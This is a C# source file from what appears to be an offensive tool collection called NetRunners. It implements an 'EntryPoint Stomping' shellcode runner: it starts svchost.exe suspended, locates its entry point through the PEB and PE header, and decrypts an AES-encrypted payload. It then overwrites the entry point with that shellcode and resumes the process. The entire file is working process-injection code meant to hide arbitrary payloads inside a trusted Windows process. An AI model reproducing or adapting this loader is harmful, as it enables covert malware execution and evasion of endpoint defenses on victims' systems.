using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

using NetRunners.Interfaces;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Helpers.Helper;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Data.Structs;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Runners
{
    /// <summary>
    /// This class contains the EntryPoint Stomping Shellcode Runner (Special Thanks 2 cpu0x00!)
    /// </summary>
    public class EntryPointStompingProcessInjectionRunner : IRunner
    {
        public void Run(string[] args = null)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

            // if x64
            try
            {
                // print technique name and target process (if applicable)
                string techniqueName = "EntryPoint Stomping Process Injection (x64 svchost)";
                string targetProcess = "svchost.exe";                       // extension needed
                PrintTechniqueInfo(techniqueName, targetProcess);

                // create suspended svchost process
                int result = CreateProcessA(null, $"C:\\Windows\\System32\\{targetProcess}", IntPtr.Zero, IntPtr.Zero, 0, 0x4, IntPtr.Zero, null, ref si, out pi);                
                if (result == 0) // false
                    throw new InvalidOperationException($"CreateProcessA failed with error code: {Marshal.GetLastWin32Error()}");

                // fetch PEB address using zwqueryinfo
                uint tmp = 0;
                IntPtr hProcess = pi.hProcess;
                ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
                IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

                // fetch address of the code base
                byte[] addrBuf = new byte[IntPtr.Size];
                IntPtr nRead = IntPtr.Zero;
                ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
                IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

                // parse PE header to locate address of entrypoint
                byte[] data = new byte[0x200];
                ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
                uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
                uint opthdr = e_lfanew_offset + 0x28;
                uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
                IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

                // print info for entrypoint
                int processID = pi.dwProcessId;
                var allocAddress = string.Format("{0:X}", addressOfEntryPoint); // Pointer -> String
                UInt64 number = UInt64.Parse(allocAddress); // String -> Int
                string allocAddressHex = number.ToString("x"); // Int -> Hex
                Console.WriteLine("[+] EntryPoint for remote processID-> " + processID + " on Mem.Address ->" + "0x" + allocAddressHex);

                // determine process architecture
                bool Is32BitProcess;
                IsWow64Process(hProcess, out Is32BitProcess);

                // select and decrypt payload
                buf = SelectPayloadArchitecture(Is32BitProcess);
                buf = DecryptBytesToBytesAes(buf, AesKey);

                // write shellcode to memory
                IntPtr outSize = IntPtr.Zero;
                WriteProcessMemory(hProcess, addressOfEntryPoint, buf, sBuf, out outSize);
                if (outSize == IntPtr.Zero)
                    throw new InvalidOperationException($"[-] WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");
                Console.WriteLine("[+] Payload has been written to the buffer!");

                //Enumerate the threads of the remote process before running.
                List<int> threadList = new List<int>();
                ProcessThreadCollection threadsBefore = Process.GetProcessById(processID).Threads;
                foreach (ProcessThread thread in threadsBefore)
                {
                    threadList.Add(thread.Id);
                }

                // resume thread
                ResumeThread(pi.hThread);

                //Enumerate threads from the given process. Print thread info
                ProcessThreadCollection threads = Process.GetProcessById(processID).Threads;
                foreach (ProcessThread thread in threads)
                {
                    if (!threadList.Contains(thread.Id))
                    {
                        Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error occurred: {e.Message}");
                throw;
            }
        }
    }
}
